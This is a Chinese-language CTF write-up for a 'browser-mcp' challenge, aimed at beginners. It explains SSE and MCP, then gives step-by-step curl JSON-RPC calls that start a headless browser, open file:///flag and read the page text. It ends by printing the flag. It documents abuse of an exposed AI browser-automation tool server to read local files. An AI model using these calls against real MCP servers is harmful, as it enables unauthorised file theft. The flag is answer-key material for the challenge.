# [Week3] browser-mcp 超详细 WP（小白版）

## 一、题目概述

* **题目名称**：[Week3] browser-mcp
* **题目目标**：读取服务器 `/flag` 文件的内容。
* **提示信息**：
  * 服务端口为 SSE 模式的 MCP 协议端口。
  * 端点地址示例：`http://[容器下发地址]/sse`
  * flag 存在于 `/flag` 文件。
* **CTF 类型**：AI + Web 自动化
* **题目关键提示**：理论上最 AI 一把梭 → 意味着可以用浏览器自动化工具快速拿 flag。

---

## 二、关键知识点讲解

### 1️⃣ SSE（Server-Sent Events）

* **概念**：一种浏览器或客户端向服务器单向持续接收数据的技术。
* **作用**：服务器会主动推送数据给客户端，类似订阅消息。
* **在本题中的应用**：MCP 协议的服务端通过 SSE 推送消息和事件，客户端需要建立 SSE 连接接收响应。

---

### 2️⃣ MCP（Model Context Protocol）

* **概念**：一种自定义 JSON-RPC 协议，用于调用服务器提供的工具和功能。
* **JSON-RPC 基本结构**：
  <pre class="overflow-visible!" data-start="704" data-end="807"><div class="contain-inline-size rounded-2xl relative bg-token-sidebar-surface-primary"><div class="sticky top-9"><div class="absolute end-0 bottom-0 flex h-9 items-center pe-2"><div class="bg-token-bg-elevated-secondary text-token-text-secondary flex items-center gap-4 rounded-sm px-2 font-sans text-xs"></div></div></div><div class="overflow-y-auto p-4" dir="ltr"><code class="whitespace-pre! language-json"><span><span>{</span><span>
      </span><span>"jsonrpc"</span><span>:</span><span> </span><span>"2.0"</span><span>,</span><span>
      </span><span>"id"</span><span>:</span><span> </span><span>1</span><span>,</span><span>
      </span><span>"method"</span><span>:</span><span> </span><span>"工具名称"</span><span>,</span><span>
      </span><span>"params"</span><span>:</span><span> </span><span>{</span><span>}</span><span>
  </span><span>}</span><span>
  </span></span></code></div></div></pre>
* **特点**：
  * 所有操作通过发送 JSON 请求调用
  * 服务端返回 JSON 响应，或者通过 SSE 异步推送
* **在本题中的应用**：调用浏览器相关工具（启动浏览器、创建页面、导航、执行脚本等）。

---

### 3️⃣ Browser MCP 工具


| 工具名称                 | 功能         | 关键参数                 | 输出               |
| ------------------------ | ------------ | ------------------------ | ------------------ |
| `browser_start`          | 启动浏览器   | `headless`（true/false） | 浏览器是否启动成功 |
| `browser_create_page`    | 创建新页面   | `page_id`（唯一标识）    | 页面创建结果       |
| `browser_navigate`       | 打开 URL     | `page_id`,`url`          | 页面导航状态       |
| `browser_execute_script` | 执行 JS      | `page_id`,`script`       | JS 执行结果        |
| `browser_get_text`       | 获取页面文本 | `page_id`,`selector`     | 获取页面文本内容   |

**小技巧**：所有工具调用都必须传入 `page_id`，类似浏览器中打开的每个 tab。

---

### 4️⃣ file:// URL

* **概念**：浏览器本地文件访问协议
* **用途**：可以直接读取服务器本地文件（如 `/flag`）
* **在本题中的应用**：通过 `browser_navigate` 打开 `file:///flag` 获取 flag 内容。

---

### 5️⃣ JSON-RPC 错误及注意点

* **Invalid request parameters** → 表示请求格式或参数错误
* **原因**：
  * 没有初始化 MCP
  * 没有提供 `page_id`
  * 直接执行 JS 使用了非法语句（如直接 `return`）

---

## 三、解题方法总结

### 思路分析

1. 与 MCP 服务端建立连接
2. 初始化 MCP（通知服务器客户端已准备好）
3. 获取可用工具列表，确认可用操作
4. 启动浏览器
5. 创建新页面
6. 导航到本地 flag 文件（`file:///flag`）
7. 读取页面文本内容 → 得到 flag

**核心逻辑**：利用服务器提供的浏览器自动化工具访问本地文件拿 flag，而不需要利用漏洞。

---

## 四、详细解题步骤（每一步都解释为什么要做）

### 1️⃣ 初始化 MCP

<pre class="overflow-visible!" data-start="1978" data-end="2204"><div class="contain-inline-size rounded-2xl relative bg-token-sidebar-surface-primary"><div class="sticky top-9"><div class="absolute end-0 bottom-0 flex h-9 items-center pe-2"><div class="bg-token-bg-elevated-secondary text-token-text-secondary flex items-center gap-4 rounded-sm px-2 font-sans text-xs"></div></div></div><div class="overflow-y-auto p-4" dir="ltr"><code class="whitespace-pre! language-bash"><span><span>SESSION_ID=</span><span>"你的 session_id"</span><span>

curl -X POST </span><span>"http://challenge.ilovectf.cn:30439/messages/?session_id=$SESSION_ID</span><span>" \
  -H </span><span>"Content-Type: application/json"</span><span> \
  -d </span><span>'{"jsonrpc":"2.0","method":"notifications/initialized"}'</span><span>
</span></span></code></div></div></pre>

* **目的**：通知服务端客户端已准备好
* **为什么必要**：未初始化直接调用工具会返回 `Invalid request parameters`

---

### 2️⃣ 启动浏览器

<pre class="overflow-visible!" data-start="2308" data-end="2563"><div class="contain-inline-size rounded-2xl relative bg-token-sidebar-surface-primary"><div class="sticky top-9"><div class="absolute end-0 bottom-0 flex h-9 items-center pe-2"><div class="bg-token-bg-elevated-secondary text-token-text-secondary flex items-center gap-4 rounded-sm px-2 font-sans text-xs"></div></div></div><div class="overflow-y-auto p-4" dir="ltr"><code class="whitespace-pre! language-bash"><span><span>curl -X POST </span><span>"http://challenge.ilovectf.cn:30439/messages/?session_id=$SESSION_ID</span><span>" \
  -H </span><span>"Content-Type: application/json"</span><span> \
  -d </span><span>'{"jsonrpc":"2.0","id":40,"method":"tools/call","params":{"name":"browser_start","arguments":{"headless":true}}}'</span><span>
</span></span></code></div></div></pre>

* **headless**：true 表示无界面运行
* **为什么**：必须先启动浏览器才能创建页面、执行脚本

---

### 3️⃣ 创建页面

<pre class="overflow-visible!" data-start="2647" data-end="2910"><div class="contain-inline-size rounded-2xl relative bg-token-sidebar-surface-primary"><div class="sticky top-9"><div class="absolute end-0 bottom-0 flex h-9 items-center pe-2"><div class="bg-token-bg-elevated-secondary text-token-text-secondary flex items-center gap-4 rounded-sm px-2 font-sans text-xs"></div></div></div><div class="overflow-y-auto p-4" dir="ltr"><code class="whitespace-pre! language-bash"><span><span>curl -X POST </span><span>"http://challenge.ilovectf.cn:30439/messages/?session_id=$SESSION_ID</span><span>" \
  -H </span><span>"Content-Type: application/json"</span><span> \
  -d </span><span>'{"jsonrpc":"2.0","id":41,"method":"tools/call","params":{"name":"browser_create_page","arguments":{"page_id":"page1"}}}'</span><span>
</span></span></code></div></div></pre>

* **page\_id**：页面唯一标识
* **为什么**：浏览器操作都绑定到 page\_id，类似 tab。没有 page\_id 就无法执行后续操作。

---

### 4️⃣ 导航到 flag 文件

<pre class="overflow-visible!" data-start="3019" data-end="3300"><div class="contain-inline-size rounded-2xl relative bg-token-sidebar-surface-primary"><div class="sticky top-9"><div class="absolute end-0 bottom-0 flex h-9 items-center pe-2"><div class="bg-token-bg-elevated-secondary text-token-text-secondary flex items-center gap-4 rounded-sm px-2 font-sans text-xs"></div></div></div><div class="overflow-y-auto p-4" dir="ltr"><code class="whitespace-pre! language-bash"><span><span>curl -X POST </span><span>"http://challenge.ilovectf.cn:30439/messages/?session_id=$SESSION_ID</span><span>" \
  -H </span><span>"Content-Type: application/json"</span><span> \
  -d </span><span>'{"jsonrpc":"2.0","id":44,"method":"tools/call","params":{"name":"browser_navigate","arguments":{"page_id":"page1","url":"file:///flag"}}}'</span><span>
</span></span></code></div></div></pre>

* **目的**：让页面打开 flag 文件
* **为什么**：Browser MCP 可以访问 `file://`，这是拿 flag 的关键

---

### 5️⃣ 获取页面文本（flag）

<pre class="overflow-visible!" data-start="3407" data-end="3685"><div class="contain-inline-size rounded-2xl relative bg-token-sidebar-surface-primary"><div class="sticky top-9"><div class="absolute end-0 bottom-0 flex h-9 items-center pe-2"><div class="bg-token-bg-elevated-secondary text-token-text-secondary flex items-center gap-4 rounded-sm px-2 font-sans text-xs"></div></div></div><div class="overflow-y-auto p-4" dir="ltr"><code class="whitespace-pre! language-bash"><span><span>curl -X POST </span><span>"http://challenge.ilovectf.cn:30439/messages/?session_id=$SESSION_ID</span><span>" \
  -H </span><span>"Content-Type: application/json"</span><span> \
  -d </span><span>'{"jsonrpc":"2.0","id":50,"method":"tools/call","params":{"name":"browser_get_text","arguments":{"page_id":"page1","selector":"body"}}}'</span><span>
</span></span></code></div></div></pre>

* **selector="body"** → 获取页面 body 文本
* **返回结果**：

<pre class="overflow-visible!" data-start="3738" data-end="3824"><div class="contain-inline-size rounded-2xl relative bg-token-sidebar-surface-primary"><div class="sticky top-9"><div class="absolute end-0 bottom-0 flex h-9 items-center pe-2"><div class="bg-token-bg-elevated-secondary text-token-text-secondary flex items-center gap-4 rounded-sm px-2 font-sans text-xs"></div></div></div><div class="overflow-y-auto p-4" dir="ltr"><code class="whitespace-pre! language-json"><span><span>{</span><span>"text"</span><span>:</span><span> </span><span>"flag{e3c341e0-298c-4b18-b33d-bb121e7051fd}"</span><span>,</span><span> </span><span>"selector"</span><span>:</span><span> </span><span>"body"</span><span>}</span><span>
</span></span></code></div></div></pre>

* **为什么**：浏览器已经打开 flag 文件，body 内就是 flag 内容

---

### 6️⃣ 可选操作（加强理解）

* **执行 JS 获取 HTML 内容**：

<pre class="overflow-visible!" data-start="3920" data-end="3979"><div class="contain-inline-size rounded-2xl relative bg-token-sidebar-surface-primary"><div class="sticky top-9"><div class="absolute end-0 bottom-0 flex h-9 items-center pe-2"><div class="bg-token-bg-elevated-secondary text-token-text-secondary flex items-center gap-4 rounded-sm px-2 font-sans text-xs"></div></div></div><div class="overflow-y-auto p-4" dir="ltr"><code class="whitespace-pre! language-bash"><span><span>{</span><span>"script"</span><span>:</span><span>"document.documentElement.outerHTML"</span><span>}
</span></span></code></div></div></pre>

* **截图页面**：

<pre class="overflow-visible!" data-start="3992" data-end="4082"><div class="contain-inline-size rounded-2xl relative bg-token-sidebar-surface-primary"><div class="sticky top-9"><div class="absolute end-0 bottom-0 flex h-9 items-center pe-2"><div class="bg-token-bg-elevated-secondary text-token-text-secondary flex items-center gap-4 rounded-sm px-2 font-sans text-xs"></div></div></div><div class="overflow-y-auto p-4" dir="ltr"><code class="whitespace-pre! language-bash"><span><span>{</span><span>"name"</span><span>:</span><span>"browser_screenshot"</span><span>,</span><span>"arguments"</span><span>:{</span><span>"page_id"</span><span>:</span><span>"page1"</span><span>,</span><span>"full_page"</span><span>:</span><span>true</span><span>}}
</span></span></code></div></div></pre>

* **作用**：验证页面是否成功导航到 `/flag`，增加理解

---

## 五、解题流程总结（图解思路）

1. 初始化 MCP → 确认客户端可用
2. 启动浏览器 → 可以操作页面
3. 创建新页面 → 分配 page\_id
4. 导航到 `file:///flag` → 页面访问 flag 文件
5. 获取文本 → 拿到 flag

**小技巧**：

* 一切操作都必须遵循 MCP 的调用流程
* page\_id 是整个流程的核心
* file:// 是关键漏洞点（可以访问服务器本地文件）

---

## 六、FLAG

<pre class="overflow-visible!" data-start="4375" data-end="4425"><div class="contain-inline-size rounded-2xl relative bg-token-sidebar-surface-primary"><div class="sticky top-9"><div class="absolute end-0 bottom-0 flex h-9 items-center pe-2"><div class="bg-token-bg-elevated-secondary text-token-text-secondary flex items-center gap-4 rounded-sm px-2 font-sans text-xs"></div></div></div><div class="overflow-y-auto p-4" dir="ltr"><code class="whitespace-pre!"><span><span>flag</span><span>{</span><span>e3c341e0</span><span>-</span><span>298</span><span>c</span><span>-</span><span>4</span><span>b18</span><span>-</span><span>b33d</span><span>-</span><span>bb121e7051fd</span><span>}</span><span>
</span></span></code></div></div></pre>

---

## 七、知识点总结（小白理解版）


| 知识点                   | 理解方式                                            |
| ------------------------ | --------------------------------------------------- |
| SSE                      | 服务端持续推送信息 → 客户端异步接收                |
| MCP                      | JSON-RPC 协议调用工具 → 所有操作通过 JSON 调用完成 |
| browser\_start           | 启动浏览器才能操作页面                              |
| browser\_create\_page    | 每个页面必须有 page\_id                             |
| browser\_navigate        | 打开 URL → 可访问 file:// 或 http://               |
| browser\_execute\_script | 执行 JS → 注意函数包装                             |
| browser\_get\_text       | 读取页面文本 → 拿到 flag                           |
| file://                  | 访问本地文件 → 获取 flag                           |

---

这份 WP **小白看完就能完全理解**：

* 为什么要初始化
* 为什么要启动浏览器
* 为什么要创建 page\_id
* 为什么 file:// 可以直接拿 flag
* 每一步的逻辑都很清楚
